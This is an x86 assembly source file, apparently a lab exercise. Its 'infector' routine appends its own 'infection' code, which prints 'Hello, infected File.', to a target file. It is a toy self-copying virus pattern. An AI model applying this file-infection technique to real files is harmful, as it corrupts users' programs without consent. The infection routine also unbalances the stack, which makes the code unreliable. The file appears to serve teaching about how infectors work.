section .data
    mes  db  'Hello, infected File.'
    mesLen  equ $- mes

section .text
global _start
global system_call
global infection
global infector
global code_start
global code_end

extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi, esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
    infection:  
    push    ebp             ; Save caller state
    mov     ebp, esp        ;
    ; sub     esp, 4          ; Leave space for local var on stack
    ; pushad                  ; Save some more caller state
    ; mov ebx, [ebp+8]        ; place given argument into ebx
    ; mov eax, 1              ; prepare mask
    ; and ebx, eax 	    ; get parity bit
    ; cmp ebx, 1              ; check if parity bit is 1
    ; jnz after_print         ; odd
    mov eax, 0x4            ; use write syscall
    mov ebx, 1              ; use stdout
    mov ecx, mes            ; use the message
    mov edx, mesLen         ; use the message length
    int     0x80            ; Transfer control to operating system
;--------------------------------------------------------------------------------------
after_print:
    ; mov     [ebp-4], eax    ; Save returned value...
    ; popad                   ; Restore caller state (registers)
    ; mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
code_end:

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp        ;
    sub     esp, 4          ; Leave space for Slocal var on stack
    pushad                  ; Save some more caller state
;--------------------------------------------------------------------------------------
    mov     eax, 0x5        ; system call open
    mov     ebx, [ebp+8]    ; Copy function arg to register b
    mov     ecx, 1024       ; 
    or ecx, 1               ; 
    mov     edx, 0x7777     ; 
    int     0x80            ;
    mov [ebp-4], eax        ; save file descriptor
;--------------------------------------------------------------------------------------  
    mov edx, code_end       ;
    sub edx, code_start     ; 
    mov eax, 0x4            ; use write syscall
    mov ebx, [ebp-4]        ; use file descriptor
    mov ecx, code_start     ; 
    int     0x80            ; Transfer control to operating system
;--------------------------------------------------------------------------------------
    mov eax, 0x6            ; use close syscall
    mov ebx, [ebp-4]        ; use stdout
    int     0x80            ; Transfer control to operating system
;--------------------------------------------------------------------------------------
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
